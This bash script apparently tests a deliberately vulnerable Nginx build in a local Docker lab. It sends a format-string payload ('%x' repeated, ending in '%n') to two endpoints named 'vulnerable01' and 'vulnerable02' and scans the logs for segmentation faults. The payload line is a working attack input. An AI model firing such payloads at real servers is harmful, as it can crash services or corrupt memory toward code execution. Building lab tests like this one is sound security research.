#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check for Signal 11 (SIGSEGV)
check_signal_11() {
    local logs=$1
    if echo "$logs" | grep -q "exited on signal 11"; then
        echo -e "\n${RED}=== Segmentation Fault Detected (Signal 11) ===${NC}"
        echo -e "${YELLOW}A segmentation fault (SIGSEGV) occurred, which indicates:${NC}"
        echo -e "1. The program attempted to access memory that it was not allowed to access"
        echo -e "2. The program attempted to access memory in a way that was not allowed"
        echo -e "3. This is a critical security vulnerability that could lead to:"
        echo -e "   - Denial of Service (DoS)"
        echo -e "   - Information disclosure"
        echo -e "   - Potential remote code execution"
        echo -e "\n${YELLOW}For more information about Signal 11, visit:${NC}"
        echo -e "https://www.liquidweb.com/blog/signal11/"
        echo -e "\n${RED}=== End of Signal 11 Analysis ===${NC}\n"
    fi
}

# Function to start container
start_container() {
    echo -e "${YELLOW}=== Starting Docker container ===${NC}"
    docker run -d --name nginx-test -p 8080:80 nginx-format-string

    if [ $? -ne 0 ]; then
        echo -e "${RED}Failed to start container${NC}"
        exit 1
    fi

    echo -e "${GREEN}Container started successfully${NC}"
    echo -e "${YELLOW}Waiting for Nginx to start...${NC}"
    sleep 2
}

# Function to clean logs
clean_logs() {
    echo -e "${YELLOW}=== Cleaning Nginx logs ===${NC}"
    docker exec nginx-test sh -c "echo '' > /usr/local/nginx/logs/error.log"
    docker exec nginx-test sh -c "echo '' > /usr/local/nginx/logs/access.log"
}

# Function to stop and remove container
cleanup_container() {
    echo -e "${YELLOW}=== Cleaning up container ===${NC}"
    docker stop nginx-test
    docker rm nginx-test
}

# Function to test an endpoint
test_endpoint() {
    local endpoint=$1
    echo -e "\n${YELLOW}=== Testing endpoint: $endpoint ===${NC}"
    echo -e "${YELLOW}Sending payload: $PAYLOAD${NC}"

    # Send request and capture response with verbose output
    echo -e "${YELLOW}=== Sending request with verbose output ===${NC}"
    curl -v -s -w "\n%{http_code}" "http://localhost:8080/$endpoint$PAYLOAD" 2>&1

    # Send request again to capture response
    RESPONSE=$(curl -s -w "\n%{http_code}" "http://localhost:8080/$endpoint$PAYLOAD")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | sed '$d')

    echo -e "\n${YELLOW}=== Response Details ===${NC}"
    echo -e "Response code: ${HTTP_CODE}"
    echo -e "Response body:"
    echo "$BODY"

    # Check container logs
    echo -e "\n${YELLOW}=== Container Logs ===${NC}"
    CONTAINER_LOGS=$(docker logs nginx-test)
    echo "$CONTAINER_LOGS"
    check_signal_11 "$CONTAINER_LOGS"

    # Check error logs inside container
    echo -e "\n${YELLOW}=== Nginx Error Logs ===${NC}"
    ERROR_LOGS=$(docker exec nginx-test cat /usr/local/nginx/logs/error.log)
    echo "$ERROR_LOGS"
    check_signal_11 "$ERROR_LOGS"

    # Check access logs inside container
    echo -e "\n${YELLOW}=== Nginx Access Logs ===${NC}"
    docker exec nginx-test cat /usr/local/nginx/logs/access.log

    # Clean logs for next test
    clean_logs
}

echo -e "${YELLOW}=== Building Docker image ===${NC}"
docker build -t nginx-format-string .

if [ $? -ne 0 ]; then
    echo -e "${RED}Docker build failed${NC}"
    exit 1
fi

echo -e "${GREEN}Docker image built successfully${NC}"

# Start container for test
start_container

# Test payload for format string vulnerability
PAYLOAD="%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n"

# Test both vulnerable endpoints
test_endpoint "vulnerable01"
test_endpoint "vulnerable02"

# Final cleanup
cleanup_container

echo -e "${GREEN}=== Test complete ===${NC}" 